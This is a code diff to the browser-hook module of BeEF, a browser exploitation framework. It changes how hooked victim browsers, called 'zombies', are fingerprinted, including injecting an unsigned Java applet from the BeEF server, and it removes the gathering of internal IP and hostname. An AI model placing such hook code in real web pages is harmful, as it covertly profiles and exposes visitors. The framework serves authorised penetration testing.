@@ -492,38 +492,55 @@ beef.browser = {
 			return flash_installed;
 		}
 	},
+
+	/**
+	* Checks if the zombie has Java enabled.
+ 	 * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.javaEnabled()) { ... }
+     */
+	javaEnabled: function() {
+
+		return (!!window.navigator.javaEnabled && !!window.navigator.javaEnabled());
 	
+	},
+
 	/**
 	 * Checks if the zombie has Java installed and enabled.
 	 * @return: {Boolean} true or false.
 	 *
 	 * @example: if(beef.browser.hasJava()) { ... }
 	 */
- 	
 	hasJava: function() {
-		if(!this.type().IE && window.navigator.javaEnabled && window.navigator.javaEnabled()) {
-			// if Chrome is detected, return true without injecting the unsigned applet.
-            // latest versions of Chrome requires manual user intervention even with unsigned applets,
-            // so basically we don't want to alert the user after the initial hook.
 
-            //todo antisnatchor: this is a temporal fix, otherwise Safari is not-hooked.
-            //todo the applet in safari takes a few seconds to load.
-	        if(beef.browser.isC() && beef.browser.isS()){
-				return true;
+		// Check if Java is enabled
+		if (!beef.browser.javaEnabled()) {
+			return false;
+		}
 
-			}else{
-				//inject an unsigned java applet to double check if the Java plugin is working fine.
-				var applet_archive = 'http://'+beef.net.host+ ':' + beef.net.port + '/demos/checkJava.jar';
-    				var applet_id = 'checkJava';
-    				var applet_name = 'checkJava';
-    				var output;
-    				beef.dom.attachApplet(applet_id, 'Microsoft_Corporation', 'checkJava' ,
-  					null, applet_archive, null);
-    				output = document.Microsoft_Corporation.getInfo();
-				beef.dom.detachApplet('checkJava');
-				return output = 1;
-			}	
-		}return false;
+        // This is a temporary fix as this does not work on Safari and Chrome
+		// Chrome requires manual user intervention even with unsigned applets.
+		// Safari requires a few seconds to load the applet.
+		if (beef.browser.isC() || beef.browser.isS()) {
+			return true;
+		}
+
+		// Inject an unsigned java applet to double check if the Java
+		// plugin is working fine.
+		try {
+			var applet_archive = 'http://'+beef.net.host+ ':' + beef.net.port + '/demos/checkJava.jar';
+   				var applet_id = 'checkJava';
+   				var applet_name = 'checkJava';
+   				var output;
+   				beef.dom.attachApplet(applet_id, 'Microsoft_Corporation', 'checkJava' ,
+  				null, applet_archive, null);
+   				output = document.Microsoft_Corporation.getInfo();
+			beef.dom.detachApplet('checkJava');
+			return output = 1;
+		} catch(e) {
+			return false;
+		}
+		return false;
 	},
 	
 	/**
@@ -694,12 +711,10 @@ beef.browser = {
 		var browser_plugins = beef.browser.getPlugins();
 		var os_name = beef.os.getName();
 		var system_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
-		var internal_ip = beef.net.local.getLocalAddress();
-		var internal_hostname = beef.net.local.getLocalHostname();
 		var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {if (value == true) return value; else if (typeof value == 'object') return value; else return;});
 		var screen_params = beef.browser.getScreenParams();
 		var window_size = beef.browser.getWindowSize();
-		var java_enabled = (beef.browser.hasJava())? "Yes" : "No";
+		var java_enabled = (beef.browser.javaEnabled())? "Yes" : "No";
 		var vbscript_enabled=(beef.browser.hasVBScript())? "Yes" : "No";
 		var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
 		var has_googlegears=(beef.browser.hasGoogleGears())? "Yes":"No";
@@ -720,12 +735,10 @@ beef.browser = {
 		if(browser_plugins) details["BrowserPlugins"] = browser_plugins;
 		if(os_name) details['OsName'] = os_name;
 		if(system_platform) details['SystemPlatform'] = system_platform;
-		if(internal_ip) details['InternalIP'] = internal_ip;
-		if(internal_hostname) details['InternalHostname'] = internal_hostname;
 		if(browser_type) details['BrowserType'] = browser_type;
 		if(screen_params) details['ScreenParams'] = screen_params;
 		if(window_size) details['WindowSize'] = window_size;
-		if(java_enabled) details['JavaEnabled'] = java_enabled
+		if(java_enabled) details['JavaEnabled'] = java_enabled;
 		if(vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled
 		if(has_flash) details['HasFlash'] = has_flash
 		if(has_web_socket) details['HasWebSocket'] = has_web_socket
